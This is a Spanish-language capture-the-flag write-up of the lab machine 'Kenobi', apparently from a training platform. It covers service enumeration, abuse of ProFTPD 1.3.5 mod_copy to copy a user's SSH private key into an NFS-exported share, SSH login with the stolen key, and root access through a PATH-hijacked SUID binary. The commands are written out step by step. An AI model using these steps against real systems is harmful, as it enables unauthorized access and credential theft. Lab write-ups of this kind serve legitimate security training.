
## Enumeracion

Empezamos haciendo un ping a la victima y viendo el TTL deduzco el sistema operativo.
`ping -c 1 vmip`
```
PING vmip (vmip) 56(84) bytes of data.
64 bytes from vmip: icmp_seq=1 ttl=62 time=27.9 ms
```
Con esto puedo deducir que es una maquina linux.

Seguimos haciendo un nmap a la victima para ver que puertos tiene abiertos.
`nmap -sVC vmip`
`nmap -vvv vmip`
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b3:91:01:2d:92:6c:fb:9a:5f:fa:db:97:30:08:28:15 (RSA)
|   256 9e:90:2d:6d:1f:34:f4:58:2a:49:ff:d9:88:b1:1d:8b (ECDSA)
|_  256 23:36:5d:ba:c2:ce:c8:55:0b:17:0a:0c:2c:38:b8:11 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp  open  rpcbind     2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-09-21T21:47:30
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

```
```
21/tcp   open  ftp          syn-ack ttl 62
22/tcp   open  ssh          syn-ack ttl 62
80/tcp   open  http         syn-ack ttl 62
111/tcp  open  rpcbind      syn-ack ttl 62
139/tcp  open  netbios-ssn  syn-ack ttl 62
445/tcp  open  microsoft-ds syn-ack ttl 62
2049/tcp open  nfs          syn-ack ttl 62

```

## Enumerar SAMBA

Veo que tiene un servidor SAMBA abierto empiezo a intentar enumerar que compartidas 
`enum4linux vmip`
```samba
[+] Attempting to map shares on vmip                                                                                                                        
                                                                                                                                                                      
/vmip/print$ Mapping: DENIED Listing: N/A Writing: N/A                                                                                                     
//vmip/anonymous      Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                                                        
                                                                                                                                                                      
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                            
//vmip/IPC$   Mapping: N/A Listing: N/A Writing: N/A


```


Veo que hay una compartida con la que se puede acceder con el usuario anonimo asi que decido entrar a investigar.
`smbclient //vmip/anonymous`

Miro que hay dentro y veo que solo hay un `txt` con el nombre de log.
```
smb: \ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Sat Aug  9 09:03:22 2025
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
```

Me descargo el archivo a mi ordenador.
`smb: \> GET log.txt `

Al ver el contenido del txt habia informacion generada al usuario kenobi cuando estaba creando una clave SSH. Informacion sobre el servidor ProFTPD.

Con esta informacion, decido usar nmap para enumerar el rpcbind que encontre anteriormente usando nmap. Ya que podriamos saber que servicios rpc hay registrados.
`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount vmip`
```
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9183416.0  5776096.0  2916724.0  67%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

Con esto puedo ver que el servidor tiene un mount de la carpeta `/var`.

## Ganando acceso con ProFTPD

Empiezo conectandome al servidor para asi poder saber la version
`nc vmip 21`
`ProFTPD 1.3.5`

Ahora busco esta version con searchsploit para ver si existe alguno.
`searchsploit ProFTPD 1.3.5`
```
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                           | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                 | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                             | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                           | linux/remote/36742.txt
---------------------------------------------------------------------------------------------
```

 Elijo usar el mod_copy ya que lo que hace el modulo es implementar los comandos `SITE CPFR` y `SITE CPTO` que pueden ser usados para copiar archivos de un lado a otro. Esto puede derivar a que cualquier usuario no autenticado pueda usar esos comandos para copiar archivos de una parte del sistema a otro sitio.

Y como en el `log.txt` salia que el usuario del FTP era kenobi podemos saber que es el usuario que el servicio corre como el usuario kenobi y que se genera una clave ssh para ese usuario.

### Copiar clave privada 

Voy a copiar la clave privada de Kenobi usando `SITE CPFR` y `SITE CPTO`.

Empiezo conectandome.
`nc vmip 21`
Sigo usando el comando `SITE CPFR` para copiar su clave privada al la carpeta exportada `/var`.
`SITE CPFR /home/kenobi/.ssh/id_rsa
`
`SITE CPTO /var/tmp/id_rsa
`

Como se que el directorio `/var` es un mount. 

Empiezo a montar el directorio `/var/tmp` a mi maquina.

`mkdir /mnt/"Nombre"`
`mount vmip:/var /mnt/"Nombre"`
`ls -la /mnt/"Nombre"`


Ya con la mount en nuestra maquina podemos copiar la clave privada del directorio `/var/tmp` y logearnos a la cuenta de kenobi.
`cp /mnt/"Nombre"/tmp/id_rsa .`
`sudo chmod 600 id_rsa`
`ssh -i id_rsa kenobi@vmip`

Y ya una vez dentro podemos conseguir la primera flag en la ruta `/home/kenobi/user.txt`


## Privilege Escalation

Empiezo buscando suids con el comando.
`find / -perm -u=s -type f 2>/dev/null`
```
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
```

Al ver los resultados veo que hay un archivo fuera de lo normal que es `usr/bin/menu`
Primero empiezo a ver con que usuario se ejecuta.
`ls -l /usr/bin/menu`
`-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu`
Veo que se ejecuta con privilegios de root.
Lo ejecuto para ver que opciones tiene y al ejecutarlo veo que da 3 opciones.  Veo que una de las que da es una comprobacion de estado y lo que hace es mandar un curl.

Uso strings para ver como lo hace y veo que lo que hace es mandar el curl pero sin ruta absoluta.
 `strings /usr/bin/menu` 

Lo que voy a hacer es crear un archivo con el nombre de `curl` en `tmp` y dentro de el poner `/bin/sh` que lo que hace es crear una shell en.

`echo /bin/sh > curl`
```
curl -I localhost
uname -r
ifconfig
```

Sigo dandole todos los permisos al archivo.

`chmod 777 curl`

Sigo modificando la variable de entorno PATH para que `/tmp` se busque antes que los directorios del sistema asi cuando `/usr/bin/menu` busque para ejecutar el curl acabe ejecutando el falso ya que sera el primero que encuentre. 
`export PATH=/tmp:$PATH`

`/usr/bin/menu` y ejecuto el script y elijo la opcion de `Status Check` y al ejecutarlo nos da la shell con root.

Ahora ya con root pide que busquemos la flag en `/root/root.txt`

`cd /root`
`cat root.txt`

## Cosas aprendidas

1. Explotar un SUID creando un script falso.
2. Enumeracion de rpcbind
3. Conseguir informacion de mount mal configuradas.